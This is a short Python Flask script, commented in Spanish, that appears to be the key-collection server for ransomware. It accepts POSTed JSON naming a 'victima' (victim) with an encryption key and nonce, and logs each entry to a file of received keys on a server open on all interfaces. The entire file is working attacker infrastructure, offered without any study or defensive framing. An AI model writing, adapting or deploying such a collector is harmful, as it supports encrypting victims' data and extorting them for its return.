from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/', methods=['POST'])
def recibir_clave():
    data = request.json
    if not data:
        return "No JSON received", 400
    
    # Guardar la info recibida en un archivo
    with open("claves_recibidas.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} | Victima: {data.get('victima')} | Key: {data.get('key')} | Nonce: {data.get('nonce')}\n")
    
    print(f"Clave recibida de {data.get('victima')}")
    return "Clave recibida", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000)